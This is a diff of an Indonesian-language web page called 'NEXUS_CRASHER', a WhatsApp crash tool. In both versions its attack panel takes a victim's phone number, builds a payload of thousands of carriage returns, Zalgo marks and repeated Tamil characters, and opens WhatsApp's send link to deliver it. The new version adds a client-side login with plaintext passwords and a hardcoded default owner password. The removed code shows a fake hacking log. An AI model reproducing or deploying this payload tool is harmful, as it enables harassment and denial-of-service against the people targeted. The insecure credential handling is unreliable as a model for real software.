@@ -5,207 +5,156 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NEXUS_CRASHER v1.1 | hanzX</title>
     <style>
-        :root {
-            --bg: #090206;
-            --panel: #160410;
-            --neon: #cc0033; /* Crimson Red */
-            --text: #ffffff;
-            --sub-text: #8b8b8b;
-        }
-
-        body {
-            background-color: var(--bg);
-            color: var(--text);
-            font-family: 'Segoe UI', sans-serif;
-            margin: 0;
-            overflow-x: hidden;
-            background-image: url('https://rehan271112-ctrl.github.io/nexus-crasher-v1/pattern.png'); /* Pattern dots */
-        }
-
-        /* CARD */
-        .card {
-            background: var(--panel);
-            margin: 15px;
-            padding: 20px;
-            border-radius: 15px;
-            border: 1px solid rgba(204, 0, 51, 0.3);
-            box-shadow: 0 0 15px rgba(204, 0, 51, 0.5);
-        }
-
-        /* INPUT */
-        input, select {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            background: #250a1f;
-            border: 1px solid var(--neon);
-            border-radius: 8px;
-            color: white;
-            box-sizing: border-box;
-            outline: none;
-        }
-
-        /* BUTTONS */
-        .btn-main {
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(45deg, #cc0033, #800000);
-            border: none;
-            border-radius: 10px;
-            color: white;
-            font-weight: bold;
-            text-transform: uppercase;
-            cursor: pointer;
-            box-shadow: 0 0 10px rgba(204, 0, 51, 0.7);
-        }
-
-        /* PAIRING CODE BOX */
-        .pairing-code {
-            background: #000;
-            color: #00ff00;
-            padding: 15px;
-            border: 2px dashed var(--neon);
-            font-size: 1.8rem;
-            text-align: center;
-            letter-spacing: 7px;
-            font-weight: bold;
-            margin: 15px 0;
-            font-family: 'Courier New', monospace;
-        }
-
-        /* NAV BOTTOM */
-        .nav-bottom {
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-            background: var(--panel);
-            display: flex;
-            justify-content: space-around;
-            padding: 15px 0;
-            border-top: 1px solid var(--neon);
-        }
-        .nav-item { color: var(--sub-text); font-size: 0.8rem; text-align: center; cursor: pointer; }
-        .nav-item.active { color: var(--neon); text-shadow: 0 0 8px var(--neon); }
+        :root { --bg: #090206; --panel: #160410; --neon: #cc0033; --text: #ffffff; }
+        body { background-color: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; padding-bottom: 80px; }
+        .card { background: var(--panel); margin: 15px; padding: 20px; border-radius: 15px; border: 1px solid rgba(204, 0, 51, 0.3); box-shadow: 0 0 15px rgba(204, 0, 51, 0.5); }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #250a1f; border: 1px solid var(--neon); border-radius: 8px; color: white; box-sizing: border-box; }
+        .btn-main { width: 100%; padding: 15px; background: linear-gradient(45deg, #cc0033, #800000); border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; }
+        .nav-bottom { position: fixed; bottom: 0; width: 100%; background: var(--panel); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid var(--neon); z-index: 100; }
+        .nav-item { color: #8b8b8b; font-size: 0.7rem; text-align: center; cursor: pointer; text-transform: uppercase; }
+        .nav-item.active { color: var(--neon); text-shadow: 0 0 8px var(--neon); font-weight: bold; }
         .hidden { display: none !important; }
+        .role-badge { padding: 2px 8px; border-radius: 4px; font-size: 0.7rem; font-weight: bold; }
+        .owner { background: #ffcc00; color: black; }
+        .member { background: #00ff00; color: black; }
     </style>
 </head>
 <body>
 
     <div id="login-screen" style="height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column;">
         <h1 style="color: var(--neon); text-shadow: 0 0 20px var(--neon); letter-spacing: 5px;">NEXUS_CRASHER</h1>
-        <p style="color: var(--sub-text); margin-top: -10px;">VERSION 1.1</p>
-        <div class="card" style="width: 80%;">
-            <input type="password" id="access-key" placeholder="Enter Admin Access Key...">
-            <button class="btn-main" onclick="handleLogin()">AUTHENTICATE</button>
+        <div class="card" style="width: 85%;">
+            <input type="text" id="login-user" placeholder="Username...">
+            <input type="password" id="login-pass" placeholder="Password...">
+            <button class="btn-main" onclick="handleLogin()">LOGIN TO SYSTEM</button>
             <p id="login-msg" style="color: #ff0000; font-size: 0.8rem; text-align: center; margin-top: 10px;"></p>
         </div>
     </div>
 
     <div id="app-content" class="hidden">
-        <div style="padding: 20px; border-bottom: 1px solid var(--neon); text-align: center;">
-            <div style="font-weight: bold; color: var(--neon); font-size: 1.2rem;">[ NEXUS_CRASHER v1.1 ]</div>
-            <div style="font-size: 0.8rem; color: #00ff00;">Premium Access</div>
+        <div style="padding: 20px; border-bottom: 1px solid var(--neon); display: flex; justify-content: space-between; align-items: center;">
+            <div style="font-weight: bold; color: var(--neon);">[ NEXUS_CRASHER ]</div>
+            <div id="user-info" style="font-size: 0.8rem;"></div>
         </div>
 
-        <div class="content">
-            <div id="page-sender">
-                <div class="card">
-                    <h3>MANAGE SENDER</h3>
-                    <label>Nomor WhatsApp Sender (628x):</label>
-                    <input type="number" id="sender-num" placeholder="Ex: 62812345678">
-                    <button class="btn-main" onclick="getPairingCode()">REQUEST PAIRING CODE</button>
-                    
-                    <div id="code-box" class="hidden">
-                        <p style="font-size: 0.8rem; color: var(--sub-text); margin-top: 20px;">Masukkan kode ini di WhatsApp -> Tautkan Perangkat -> Tautkan dengan nomor telepon:</p>
-                        <div class="pairing-code" id="display-code">H6JX-K9LP</div>
-                        <p style="color: yellow; font-size: 0.7rem; text-align: center;">Status: Waiting for Peer Link...</p>
-                    </div>
-                </div>
-                <div class="card" style="padding: 0; overflow: hidden; border-radius: 12px; margin-top: 20px;">
-                    <img src="https://i.ibb.co/h99Yx1F/guts.jpg" style="width: 100%; height: auto;" alt="Anime">
-                    <div style="padding: 10px; font-size: 0.8rem; font-style: italic; color: var(--sub-text);">"In this world, is man's destiny controlled by some transcendental entity or law?"</div>
-                </div>
+        <div id="page-home" class="content">
+            <div class="card">
+                <h3>DASHBOARD</h3>
+                <p>Welcome back, <b id="display-name"></b></p>
+                <p>Account Status: <span id="display-role"></span></p>
             </div>
+            <div class="card" style="padding: 0; overflow: hidden;">
+                <img src="https://i.ibb.co/h99Yx1F/guts.jpg" style="width: 100%; height: auto;">
+            </div>
+        </div>
 
-            <div id="page-attack" class="hidden">
-                <div class="card">
-                    <h3>CONTROL PANEL</h3>
-                    <label>Nomor Target:</label>
-                    <input type="number" id="target-num" placeholder="628xxxxxxx">
-                    
-                    <label>Jenis Payload:</label>
-                    <select id="payload-type">
-                        <option value="crash">NEXUS_V1.1 (FORCE CLOSE)</option>
-                        <option value="zalgo">ZALGO_LAG (FRAME DROP)</option>
-                        <option value="tamil">TAMIL_FREEZE (HEAVY)</option>
-                    </select>
-                    <br><br>
-                    <button id="attack-btn" class="btn-main" onclick="sendHeavyAttack()">EXECUTE ATTACK!</button>
-                    <p id="attack-log" style="font-size: 0.7rem; color: #00ff00; margin-top: 15px; text-align: center;"></p>
-                </div>
+        <div id="page-admin" class="content hidden">
+            <div class="card">
+                <h3>ADMIN PANEL</h3>
+                <label>New Username:</label>
+                <input type="text" id="new-user">
+                <label>New Password:</label>
+                <input type="password" id="new-pass">
+                <label>Assign Role:</label>
+                <select id="new-role">
+                    <option value="MEMBER">MEMBER (Standard)</option>
+                    <option value="OWNER">OWNER (Full Access)</option>
+                </select>
+                <button class="btn-main" onclick="createAccount()">CREATE ACCOUNT</button>
+            </div>
+            <div class="card">
+                <h4>USER LIST</h4>
+                <div id="user-list" style="font-size: 0.8rem;"></div>
+            </div>
+        </div>
+
+        <div id="page-attack" class="content hidden">
+            <div class="card">
+                <h3>ATTACK PANEL</h3>
+                <input type="number" id="target-num" placeholder="Target: 628xxxx">
+                <button class="btn-main" onclick="sendAttack()">EXECUTE ATTACK!</button>
             </div>
         </div>
 
         <nav class="nav-bottom">
-            <div class="nav-item active" onclick="showPage('sender')">SENDER</div>
-            <div class="nav-item" onclick="showPage('attack')">ATTACK</div>
+            <div class="nav-item active" onclick="showPage('home')">HOME</div>
+            <div class="nav-item" id="nav-attack" onclick="showPage('attack')">ATTACK</div>
+            <div class="nav-item hidden" id="nav-admin" onclick="showPage('admin')">ADMIN</div>
         </nav>
     </div>
 
     <script>
-        // LOGIKA LOGIN
+        // INISIALISASI DATABASE (LOCAL STORAGE)
+        if(!localStorage.getItem('nexus_users')) {
+            const defaultUsers = [{user: 'hanzX', pass: 'admin', role: 'OWNER'}];
+            localStorage.setItem('nexus_users', JSON.stringify(defaultUsers));
+        }
+
+        let currentUser = null;
+
         function handleLogin() {
-            if(document.getElementById('access-key').value === "hanzX") {
+            const u = document.getElementById('login-user').value;
+            const p = document.getElementById('login-pass').value;
+            const users = JSON.parse(localStorage.getItem('nexus_users'));
+            
+            const found = users.find(x => x.user === u && x.pass === p);
+            if(found) {
+                currentUser = found;
                 document.getElementById('login-screen').classList.add('hidden');
                 document.getElementById('app-content').classList.remove('hidden');
+                setupUI();
             } else {
-                document.getElementById('login-msg').innerText = "Incorrect Key! (HanzX Access Only)";
+                document.getElementById('login-msg').innerText = "Akun Salah mpray!";
             }
         }
 
-        // NAVIGASI
+        function setupUI() {
+            document.getElementById('display-name').innerText = currentUser.user;
+            document.getElementById('display-role').innerHTML = `<span class="role-badge ${currentUser.role.toLowerCase()}">${currentUser.role}</span>`;
+            if(currentUser.role === 'OWNER') {
+                document.getElementById('nav-admin').classList.remove('hidden');
+                renderUserList();
+            }
+        }
+
+        function createAccount() {
+            const u = document.getElementById('new-user').value;
+            const p = document.getElementById('new-pass').value;
+            const r = document.getElementById('new-role').value;
+            if(!u || !p) return alert("Isi semua cok!");
+
+            let users = JSON.parse(localStorage.getItem('nexus_users'));
+            users.push({user: u, pass: p, role: r});
+            localStorage.setItem('nexus_users', JSON.stringify(users));
+            alert("Akun " + u + " Berhasil Dibuat mpray!");
+            renderUserList();
+        }
+
+        function renderUserList() {
+            const users = JSON.parse(localStorage.getItem('nexus_users'));
+            let html = "";
+            users.forEach(x => {
+                html += `<div style="border-bottom:1px solid #333; padding:5px 0;">
+                            ${x.user} - <span class="role-badge ${x.role.toLowerCase()}">${x.role}</span>
+                         </div>`;
+            });
+            document.getElementById('user-list').innerHTML = html;
+        }
+
         function showPage(p) {
-            document.getElementById('page-sender').classList.add('hidden');
+            document.getElementById('page-home').classList.add('hidden');
+            document.getElementById('page-admin').classList.add('hidden');
             document.getElementById('page-attack').classList.add('hidden');
             document.getElementById('page-' + p).classList.remove('hidden');
             document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
             event.target.classList.add('active');
         }
 
-        // LOGIKA PAIRING CODE
-        function getPairingCode() {
-            const num = document.getElementById('sender-num').value;
-            if(!num) return alert("Isi nomor sender dulu cok!");
-            document.getElementById('code-box').classList.remove('hidden');
-            // Simulasi kode pairing acak
-            const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
-            let code = "";
-            for(let i=0; i<8; i++) code += chars.charAt(Math.floor(Math.random() * chars.length));
-            document.getElementById('display-code').innerText = code.substring(0,4) + "-" + code.substring(4,8);
-        }
-
-        // LOGIKA HEAVY ATTACK
-        function sendHeavyAttack() {
+        function sendAttack() {
             const target = document.getElementById('target-num').value;
-            const log = document.getElementById('attack-log');
-            const btn = document.getElementById('attack-btn');
-
-            if(!target) return alert("Victim number required cok!");
-
-            btn.innerText = "INJECTING payload...";
-            log.innerText = "[*] Accessing WhatsApp Mainframe...<br>";
-            
-            setTimeout(() => {
-                log.innerText += "[*] Deploying Nexus_Crasher v1.1 Payload...<br>";
-                setTimeout(() => {
-                    log.innerText += "[V] ATTACK SENT!";
-                    btn.innerText = "EXECUTE ATTACK!";
-
-                    // BUG TEXT: Ribuan Karakter Berat + Zalgo
-                    const heavyBug = encodeURIComponent("%0D".repeat(8000) + "҈҉҈҉҈҉҈҉҈҉" + " ௌௌௌ ".repeat(500) + " [ NEXUS_CRASHER v1.1 BY hanzX ] ");
-                    window.location.href = `https://api.whatsapp.com/send?phone=${target}&text=${heavyBug}`;
-                }, 1500);
-            }, 1000);
+            if(!target) return alert("Target mana cok?");
+            const heavyBug = encodeURIComponent("%0D".repeat(9000) + "҈҉҈҉҈҉" + " ௌ ".repeat(500) + " [ NEXUS_CRASHER v1.1 ] ");
+            window.location.href = `https://api.whatsapp.com/send?phone=${target}&text=${heavyBug}`;
         }
     </script>
 </body>
